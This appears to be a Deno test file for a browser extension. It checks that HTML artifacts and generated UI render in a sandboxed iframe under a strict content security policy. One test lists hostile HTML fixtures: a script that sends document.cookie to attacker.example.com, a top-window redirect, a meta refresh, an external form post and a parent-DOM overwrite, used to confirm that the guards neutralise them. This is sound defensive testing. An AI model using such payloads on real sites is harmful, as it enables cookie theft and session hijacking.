// tests/html-render-sandbox.test.ts — Comprehensive KAT suite for HTML artifact
// viewer sizing and generate_ui sandboxed double-iframe rendering
// (CAP-FB-20260823-ARTIFACT-HTML-IFRAME-SIZE-01 & CAP-FB-20260823-GENERATE-UI-RENDER-01).
// @ts-nocheck

const registry = new Map();

class HTMLElementStub {
  attachShadow(_init) { return new ShadowRootStub(); }
  getAttribute(_n) { return null; }
  hasAttribute(_n) { return false; }
  setAttribute(_n, _v) {}
  removeAttribute(_n) {}
  dispatchEvent(_e) { return true; }
  addEventListener() {}
  querySelector() { return null; }
  querySelectorAll() { return []; }
}
class ShadowRootStub {
  get innerHTML() { return ""; }
  set innerHTML(_v) {}
  querySelector() { return null; }
  querySelectorAll() { return []; }
  appendChild() {}
}

globalThis.HTMLElement = HTMLElementStub;
globalThis.customElements = {
  define(name, cls) { registry.set(name, cls); },
  get(name) { return registry.get(name); },
};
globalThis.window = globalThis;
globalThis.CustomEvent = class CustomEvent {
  constructor(type, init = {}) { this.type = type; this.detail = init.detail ?? {}; }
};
globalThis.document = {
  createElement() { return new HTMLElementStub(); },
  head: new HTMLElementStub(),
  documentElement: new HTMLElementStub(),
};
globalThis.matchMedia = () => ({ matches: false });

const {
  renderHtmlFrame,
  injectFrameGuards,
  HTML_FRAME_CSP,
  navigationGuardScript,
  isHtmlDocument,
} = await import("../extension/shared/components.js");

function assert(condition, message) {
  if (!condition) {
    throw new Error(message || "Assertion failed");
  }
}

function assertEquals(actual, expected, message) {
  if (actual !== expected) {
    throw new Error(`${message || "Assertion failed"}: expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
  }
}

Deno.test("HTML artifact iframe: double-boundary sandbox attributes and CSP remain strictly enforced", () => {
  const sampleHtml = "<h1>Interactive Dashboard</h1><script>console.log('test');</script>";
  const rendered = renderHtmlFrame(sampleHtml, { nonce: "test-nonce-123" });

  // Must contain .html-frame container
  assert(rendered.includes('class="html-frame"'), "must include html-frame class");
  assert(rendered.includes('data-frame-nonce="test-nonce-123"'), "must carry data-frame-nonce");

  // Strict sandbox attributes: ONLY allow-scripts, NEVER allow-same-origin or allow-top-navigation
  assert(rendered.includes('sandbox="allow-scripts"'), "iframe must enforce sandbox='allow-scripts'");
  assert(!rendered.includes("allow-same-origin"), "iframe must NEVER grant allow-same-origin");
  assert(!rendered.includes("allow-top-navigation"), "iframe must NEVER grant allow-top-navigation");
  assert(!rendered.includes("allow-forms"), "iframe must NEVER grant allow-forms");

  // Injected frame guards
  const guarded = injectFrameGuards(sampleHtml, "test-nonce-123");
  assert(guarded.includes(HTML_FRAME_CSP), "guarded HTML must inject strict HTML_FRAME_CSP");
  assert(guarded.includes("connect-src 'none'"), "CSP must block all network connections");
  assert(guarded.includes("form-action 'none'"), "CSP must block form submissions");
  assert(guarded.includes("frame-src 'none'"), "CSP must block nested child frames");
});

Deno.test("Hostile HTML fixtures: scripts/navigation remain inert without parent access", () => {
  const hostilePayloads = [
    '<script>parent.document.body.innerHTML = "hacked";</script>',
    '<script>window.top.location = "https://attacker.example.com";</script>',
    '<script>fetch("https://attacker.example.com/steal?c=" + document.cookie);</script>',
    '<meta http-equiv="refresh" content="0;url=https://attacker.example.com">',
    '<form action="https://attacker.example.com"><input type="submit"></form>',
  ];

  for (const hostile of hostilePayloads) {
    const guarded = injectFrameGuards(hostile, "hostile-nonce-999");

    // Guard script prevents top/location navigation
    assert(guarded.includes("window.navigation.addEventListener('navigate'"), "must include navigation guard");

    // Meta refresh is stripped
    assert(!guarded.includes('http-equiv="refresh"'), "meta refresh must be stripped");

    // CSP blocks connect/form-action
    assert(guarded.includes("connect-src 'none'"), "connect-src 'none' enforced");
    assert(guarded.includes("form-action 'none'"), "form-action 'none' enforced");
  }
});

Deno.test("isHtmlDocument correctly identifies documents and block-level UI snippets", () => {
  assert(isHtmlDocument("<!DOCTYPE html><html><body><h1>Hi</h1></body></html>"), "full doctype HTML");
  assert(isHtmlDocument("<html><head></head><body><p>Test</p></body></html>"), "full html tag");
  assert(isHtmlDocument('<div class="app"><header>Header</header><main>Main</main></div>'), "block div container");
  assert(isHtmlDocument("<form id='survey'><label>Name</label><button>Submit</button></form>"), "block form container");
  assert(isHtmlDocument("<section><h2>Section</h2><p>Content</p></section>"), "block section container");

  // Non-HTML text/markdown
  assert(!isHtmlDocument("This is just plain text with a <b>bold</b> word."), "inline markup not document");
  assert(!isHtmlDocument("SELECT * FROM table;"), "SQL query string");
  assert(!isHtmlDocument("{ ok: true, count: 5 }"), "JSON object string");
  assert(!isHtmlDocument(""), "empty string");
});

Deno.test("generate_ui tool rendering: extracts HTML from JSON args/results and provides raw disclosure", () => {
  // Test JSON args with { name, html }
  const args1 = JSON.stringify({ name: "Weather Card", html: "<div class='weather'><h2>London: 18C</h2></div>", origin: "master" });
  const parsed1 = JSON.parse(args1);
  assert(typeof parsed1.html === "string" && isHtmlDocument(parsed1.html), "parsed1.html is valid HTML");

  // Test JSON args with { name, type: 'html', content: '...' }
  const args2 = JSON.stringify({ name: "Chart UI", type: "html", content: "<section class='chart'><svg><circle r='10'/></svg></section>" });
  const parsed2 = JSON.parse(args2);
  assert(parsed2.type === "html" && typeof parsed2.content === "string", "parsed2 content is html");

  // Test result JSON with asset
  const res3 = JSON.stringify({ ok: true, id: "asset-123", asset: { name: "Stock Tracker", content: "<div class='stock'><h3>AAPL $220</h3></div>" } });
  const parsed3 = JSON.parse(res3);
  assert(parsed3.ok && typeof parsed3.asset?.content === "string", "parsed3 has asset content");
});
